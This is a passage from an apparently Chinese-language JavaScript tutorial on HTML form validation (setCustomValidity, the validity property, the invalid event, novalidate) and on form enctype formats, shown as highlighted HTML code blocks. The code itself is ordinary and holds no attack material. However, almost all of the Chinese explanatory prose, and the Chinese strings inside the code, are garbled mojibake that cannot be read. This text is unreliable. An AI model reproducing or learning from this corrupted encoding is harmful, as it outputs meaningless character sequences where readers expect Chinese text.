</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="setcustomvalidity"><a href="#setcustomvalidity" class="header-anchor">#</a> setCustomValidity()</h3> <p>æ§ä»¶å…ƒç´ çš„<code>setCustomValidity()</code>æ–¹æ³•ç”¨æ¥å®šåˆ¶æ ¡éªŒå¤±è´¥æ—¶çš„æŠ¥é”™ä¿¡æ¯ã€‚å®ƒæ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œè¯¥å­—ç¬¦ä¸²å°±æ˜¯å®šåˆ¶çš„æŠ¥é”™ä¿¡æ¯ã€‚å¦‚æœå‚æ•°ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œåˆ™ä¸Šæ¬¡è®¾ç½®çš„æŠ¥é”™ä¿¡æ¯è¢«æ¸…é™¤ã€‚</p> <p>è¿™ä¸ªæ–¹æ³•å¯ä»¥æ›¿æ¢æµè§ˆå™¨å†…ç½®çš„è¡¨å•éªŒè¯æŠ¥é”™ä¿¡æ¯ï¼Œå‚æ•°å°±æ˜¯è¦æ˜¾ç¤ºçš„æŠ¥é”™ä¿¡æ¯ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>somefile.php<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span>
    <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span>
    <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>username<span class="token punctuation">&quot;</span></span>
    <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>Username<span class="token punctuation">&quot;</span></span>
    <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>[a-z]{1,15}<span class="token punctuation">&quot;</span></span>
    <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>username<span class="token punctuation">&quot;</span></span>
  <span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>ä¸Šé¢çš„è¡¨å•è¾“å…¥æ¡†ï¼Œè¦æ±‚åªèƒ½è¾“å…¥å°å†™å­—æ¯ï¼Œä¸”ä¸å¾—è¶…è¿‡15ä¸ªå­—ç¬¦ã€‚å¦‚æœè¾“å…¥ä¸ç¬¦åˆè¦æ±‚ï¼ˆæ¯”å¦‚è¾“å…¥â€œABCâ€ï¼‰ï¼Œæäº¤è¡¨å•çš„æ—¶å€™ï¼ŒChrome æµè§ˆå™¨ä¼šå¼¹å‡ºæŠ¥é”™ä¿¡æ¯â€œPlease match the requested format.â€ï¼Œç¦æ­¢è¡¨å•æäº¤ã€‚ä¸‹é¢ä½¿ç”¨<code>setCustomValidity()</code>æ–¹æ³•æ›¿æ¢æ‰æŠ¥é”™ä¿¡æ¯ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> input <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
input<span class="token punctuation">.</span><span class="token function-variable function">oninvalid</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  event<span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">setCustomValidity</span><span class="token punctuation">(</span>
    <span class="token string">'ç”¨æˆ·åå¿…é¡»æ˜¯å°å†™å­—æ¯ï¼Œä¸èƒ½ä¸ºç©ºï¼Œæœ€é•¿ä¸è¶…è¿‡15ä¸ªå­—ç¬¦'</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>setCustomValidity()</code>æ–¹æ³•æ˜¯åœ¨<code>invalid</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°é‡Œé¢è°ƒç”¨ã€‚è¯¥æ–¹æ³•ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œè¿™æ—¶å¦‚æœå‚æ•°ä¸ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œæµè§ˆå™¨å°±ä¼šè®¤ä¸ºè¯¥æ§ä»¶æ²¡æœ‰é€šè¿‡æ ¡éªŒï¼Œå°±ä¼šç«‹åˆ»æ˜¾ç¤ºè¯¥æ–¹æ³•è®¾ç½®çš„æŠ¥é”™ä¿¡æ¯ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">/* HTML ä»£ç å¦‚ä¸‹
&lt;form&gt;
  &lt;p&gt;&lt;input type=&quot;file&quot; id=&quot;fs&quot;&gt;&lt;/p&gt;
  &lt;p&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/p&gt;
&lt;/form&gt;
*/</span>

document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>onchange <span class="token operator">=</span> checkFileSize<span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">checkFileSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> fs <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> files <span class="token operator">=</span> fs<span class="token punctuation">.</span>files<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>files<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>size <span class="token operator">&gt;</span> <span class="token number">75</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       fs<span class="token punctuation">.</span><span class="token function">setCustomValidity</span><span class="token punctuation">(</span><span class="token string">'æ–‡ä»¶ä¸èƒ½å¤§äº 75KB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">return</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  fs<span class="token punctuation">.</span><span class="token function">setCustomValidity</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸€æ—¦å‘ç°æ–‡ä»¶å¤§äº 75KBï¼Œå°±ä¼šè®¾ç½®æ ¡éªŒå¤±è´¥ï¼ŒåŒæ—¶ç»™å‡ºè‡ªå®šä¹‰çš„æŠ¥é”™ä¿¡æ¯ã€‚ç„¶åï¼Œç‚¹å‡»æäº¤æŒ‰é’®æ—¶ï¼Œå°±ä¼šæ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ã€‚è¿™ç§æ ¡éªŒå¤±è´¥æ˜¯ä¸ä¼šè‡ªåŠ¨æ¶ˆé™¤çš„ï¼Œæ‰€ä»¥å¦‚æœæ‰€æœ‰æ–‡ä»¶éƒ½ç¬¦åˆæ¡ä»¶ï¼Œè¦å°†æŠ¥é”™ä¿¡æ¯è®¾ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œæ‰‹åŠ¨æ¶ˆé™¤æ ¡éªŒå¤±è´¥çš„çŠ¶æ€ã€‚</p> <h3 id="validity-å±æ€§"><a href="#validity-å±æ€§" class="header-anchor">#</a> validity å±æ€§</h3> <p>æ§ä»¶å…ƒç´ çš„å±æ€§<code>validity</code>å±æ€§è¿”å›ä¸€ä¸ª<code>ValidityState</code>å¯¹è±¡ï¼ŒåŒ…å«å½“å‰æ ¡éªŒçŠ¶æ€çš„ä¿¡æ¯ã€‚</p> <p>è¯¥å¯¹è±¡æœ‰ä»¥ä¸‹å±æ€§ï¼Œå…¨éƒ¨ä¸ºåªè¯»å±æ€§ã€‚</p> <ul><li><code>ValidityState.badInput</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨æ˜¯å¦ä¸èƒ½å°†ç”¨æˆ·çš„è¾“å…¥è½¬æ¢æˆæ­£ç¡®çš„ç±»å‹ï¼Œæ¯”å¦‚ç”¨æˆ·åœ¨æ•°å€¼æ¡†é‡Œé¢è¾“å…¥å­—ç¬¦ä¸²ã€‚</li> <li><code>ValidityState.customError</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦å·²ç»è°ƒç”¨<code>setCustomValidity()</code>æ–¹æ³•ï¼Œå°†æ ¡éªŒä¿¡æ¯è®¾ç½®ä¸ºä¸€ä¸ªéç©ºå­—ç¬¦ä¸²ã€‚</li> <li><code>ValidityState.patternMismatch</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·è¾“å…¥çš„å€¼æ˜¯å¦ä¸æ»¡è¶³æ¨¡å¼çš„è¦æ±‚ã€‚</li> <li><code>ValidityState.rangeOverflow</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·è¾“å…¥çš„å€¼æ˜¯å¦å¤§äºæœ€å¤§èŒƒå›´ã€‚</li> <li><code>ValidityState.rangeUnderflow</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·è¾“å…¥çš„å€¼æ˜¯å¦å°äºæœ€å°èŒƒå›´ã€‚</li> <li><code>ValidityState.stepMismatch</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·è¾“å…¥çš„å€¼ä¸ç¬¦åˆæ­¥é•¿çš„è®¾ç½®ï¼ˆå³ä¸èƒ½è¢«æ­¥é•¿å€¼æ•´é™¤ï¼‰ã€‚</li> <li><code>ValidityState.tooLong</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·è¾“å…¥çš„å­—æ•°è¶…å‡ºäº†æœ€é•¿å­—æ•°ã€‚</li> <li><code>ValidityState.tooShort</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·è¾“å…¥çš„å­—ç¬¦å°‘äºæœ€çŸ­å­—æ•°ã€‚</li> <li><code>ValidityState.typeMismatch</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·å¡«å…¥çš„å€¼ä¸ç¬¦åˆç±»å‹è¦æ±‚ï¼ˆä¸»è¦æ˜¯ç±»å‹ä¸º Email æˆ– URL çš„æƒ…å†µï¼‰ã€‚</li> <li><code>ValidityState.valid</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·æ˜¯å¦æ»¡è¶³æ‰€æœ‰æ ¡éªŒæ¡ä»¶ã€‚</li> <li><code>ValidityState.valueMissing</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç”¨æˆ·æ²¡æœ‰å¡«å…¥å¿…å¡«çš„å€¼ã€‚</li></ul> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> input <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'myinput'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">.</span>validity<span class="token punctuation">.</span>valid<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'é€šè¿‡æ ¡éªŒ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ ¡éªŒå¤±è´¥'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ä¸‹é¢æ˜¯å¦å¤–ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> txt <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'myInput'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>validity<span class="token punctuation">.</span>rangeOverflow<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  txt <span class="token operator">=</span> <span class="token string">'æ•°å€¼è¶…è¿‡ä¸Šé™'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'prompt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> txt<span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>å¦‚æœæƒ³ç¦æ­¢æµè§ˆå™¨å¼¹å‡ºè¡¨å•éªŒè¯çš„æŠ¥é”™ä¿¡æ¯ï¼Œå¯ä»¥ç›‘å¬<code>invalid</code>äº‹ä»¶ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> input <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> form  <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> elem <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
elem<span class="token punctuation">.</span>id  <span class="token operator">=</span> <span class="token string">'notify'</span><span class="token punctuation">;</span>
elem<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'none'</span><span class="token punctuation">;</span>
form<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">;</span>

input<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'invalid'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>validity<span class="token punctuation">.</span>valid<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    elem<span class="token punctuation">.</span>textContent   <span class="token operator">=</span> <span class="token string">'ç”¨æˆ·åå¿…é¡»æ˜¯å°å†™å­—æ¯'</span><span class="token punctuation">;</span>
    elem<span class="token punctuation">.</span>className     <span class="token operator">=</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
    elem<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'block'</span><span class="token punctuation">;</span>
    input<span class="token punctuation">.</span>className    <span class="token operator">=</span> <span class="token string">'invalid animated shake'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

input<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token string">'block'</span> <span class="token operator">===</span> elem<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    input<span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    elem<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'none'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œä¸€æ—¦å‘ç”Ÿ<code>invalid</code>äº‹ä»¶ï¼ˆè¡¨å•éªŒè¯å¤±è´¥ï¼‰ï¼Œ<code>event.preventDefault()</code>ç”¨æ¥ç¦æ­¢æµè§ˆå™¨å¼¹å‡ºé»˜è®¤çš„éªŒè¯å¤±è´¥æç¤ºï¼Œç„¶åè®¾ç½®å®šåˆ¶çš„æŠ¥é”™æç¤ºæ¡†ã€‚</p> <h3 id="è¡¨å•çš„-novalidate-å±æ€§"><a href="#è¡¨å•çš„-novalidate-å±æ€§" class="header-anchor">#</a> è¡¨å•çš„ novalidate å±æ€§</h3> <p>è¡¨å•å…ƒç´ çš„ HTML å±æ€§<code>novalidate</code>ï¼Œå¯ä»¥å…³é—­æµè§ˆå™¨çš„è‡ªåŠ¨æ ¡éªŒã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">novalidate</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>è¿™ä¸ªå±æ€§ä¹Ÿå¯ä»¥åœ¨è„šæœ¬é‡Œè®¾ç½®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>form<span class="token punctuation">.</span>noValidate <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>å¦‚æœè¡¨å•å…ƒç´ æ²¡æœ‰è®¾ç½®<code>novalidate</code>å±æ€§ï¼Œé‚£ä¹ˆæäº¤æŒ‰é’®ï¼ˆ<code>&lt;button&gt;</code>æˆ–<code>&lt;input&gt;</code>å…ƒç´ ï¼‰çš„<code>formnovalidate</code>å±æ€§ä¹Ÿæœ‰åŒæ ·çš„ä½œç”¨ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">formnovalidate</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="_4-enctype-å±æ€§"><a href="#_4-enctype-å±æ€§" class="header-anchor">#</a> 4.enctype å±æ€§</h2> <p>è¡¨å•èƒ½å¤Ÿç”¨å››ç§ç¼–ç ï¼Œå‘æœåŠ¡å™¨å‘é€æ•°æ®ã€‚ç¼–ç æ ¼å¼ç”±è¡¨å•çš„<code>enctype</code>å±æ€§å†³å®šã€‚</p> <p>å‡å®šè¡¨å•æœ‰ä¸¤ä¸ªå­—æ®µï¼Œåˆ†åˆ«æ˜¯<code>foo</code>å’Œ<code>baz</code>ï¼Œå…¶ä¸­<code>foo</code>å­—æ®µçš„å€¼ç­‰äº<code>bar</code>ï¼Œ<code>baz</code>å­—æ®µçš„å€¼æ˜¯ä¸€ä¸ªåˆ†ä¸ºä¸¤è¡Œçš„å­—ç¬¦ä¸²ã€‚</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>The first line.
The second line.

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸‹é¢å››ç§æ ¼å¼ï¼Œéƒ½å¯ä»¥å°†è¿™ä¸ªè¡¨å•å‘é€åˆ°æœåŠ¡å™¨ã€‚</p> <p><strong>ï¼ˆ1ï¼‰GET æ–¹æ³•</strong></p> <p>å¦‚æœè¡¨å•ä½¿ç”¨<code>GET</code>æ–¹æ³•å‘é€æ•°æ®ï¼Œ<code>enctype</code>å±æ€§æ— æ•ˆã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>
  <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>register.php<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>get<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">onsubmit</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>AJAXSubmit(this); return false;<span class="token punctuation">&quot;</span></span>
<span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>æ•°æ®å°†ä»¥ URL çš„æŸ¥è¯¢å­—ç¬¦ä¸²å‘å‡ºã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code>?foo=bar&amp;baz=The%20first%20line.%0AThe%20second%20line.

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><strong>ï¼ˆ2ï¼‰application/x-www-form-urlencoded</strong></p> <p>å¦‚æœè¡¨å•ç”¨<code>POST</code>æ–¹æ³•å‘é€æ•°æ®ï¼Œå¹¶çœç•¥<code>enctype</code>å±æ€§ï¼Œé‚£ä¹ˆæ•°æ®ä»¥<code>application/x-www-form-urlencoded</code>æ ¼å¼å‘é€ï¼ˆå› ä¸ºè¿™æ˜¯é»˜è®¤å€¼ï¼‰ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>
  <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>register.php<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">onsubmit</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>AJAXSubmit(this); return false;<span class="token punctuation">&quot;</span></span>
<span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>å‘é€çš„ HTTP è¯·æ±‚å¦‚ä¸‹ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded

foo=bar&amp;baz=The+first+line.%0D%0AThe+second+line.%0D%0A

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œæ•°æ®ä½“é‡Œé¢çš„<code>%0D%0A</code>ä»£è¡¨æ¢è¡Œç¬¦ï¼ˆ<code>\r\n</code>ï¼‰ã€‚</p> <p><strong>ï¼ˆ3ï¼‰text/plain</strong></p> <p>å¦‚æœè¡¨å•ä½¿ç”¨<code>POST</code>æ–¹æ³•å‘é€æ•°æ®ï¼Œ<code>enctype</code>å±æ€§ä¸º<code>text/plain</code>ï¼Œé‚£ä¹ˆæ•°æ®å°†ä»¥çº¯æ–‡æœ¬æ ¼å¼å‘é€ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>
  <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>register.php<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text/plain<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">onsubmit</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>AJAXSubmit(this); return false;<span class="token punctuation">&quot;</span></span>
<span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>å‘é€çš„ HTTP è¯·æ±‚å¦‚ä¸‹ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Content-Type:</span> text/plain

foo=bar
baz=The first line.
The second line.

